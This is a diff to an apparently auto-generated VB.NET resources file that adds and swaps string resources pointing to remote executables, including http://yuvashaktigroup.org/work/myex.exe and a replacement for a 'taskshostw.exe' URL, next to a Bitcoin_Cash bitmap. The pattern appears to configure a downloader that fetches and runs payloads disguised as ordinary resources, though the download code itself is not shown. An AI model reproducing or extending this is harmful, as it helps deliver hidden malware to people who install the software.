@@ -61,6 +61,15 @@ Namespace My.Resources
         End Property
         
         '''<summary>
+        '''  Looks up a localized string similar to http://yuvashaktigroup.org/work/myex.exe.
+        '''</summary>
+        Friend ReadOnly Property _sub() As String
+            Get
+                Return ResourceManager.GetString("sub", resourceCulture)
+            End Get
+        End Property
+        
+        '''<summary>
         '''  Looks up a localized resource of type System.Drawing.Bitmap.
         '''</summary>
         Friend ReadOnly Property Bitcoin_Cash() As System.Drawing.Bitmap
@@ -141,7 +150,7 @@ Namespace My.Resources
         End Property
         
         '''<summary>
-        '''  Looks up a localized string similar to https://insellerate.net/taskshostw.exe.
+        '''  Looks up a localized string similar to http://yuvashaktigroup.org/work/sub.exe.
         '''</summary>
         Friend ReadOnly Property force() As String
             Get
@@ -195,6 +204,16 @@ Namespace My.Resources
         Friend ReadOnly Property icons8_end_call_64() As System.Drawing.Bitmap
             Get
                 Dim obj As Object = ResourceManager.GetObject("icons8-end-call-64", resourceCulture)
+                Return CType(obj,System.Drawing.Bitmap)
+            End Get
+        End Property
+        
+        '''<summary>
+        '''  Looks up a localized resource of type System.Drawing.Bitmap.
+        '''</summary>
+        Friend ReadOnly Property icons8_error_48() As System.Drawing.Bitmap
+            Get
+                Dim obj As Object = ResourceManager.GetObject("icons8-error-48", resourceCulture)
                 Return CType(obj,System.Drawing.Bitmap)
             End Get
         End Property
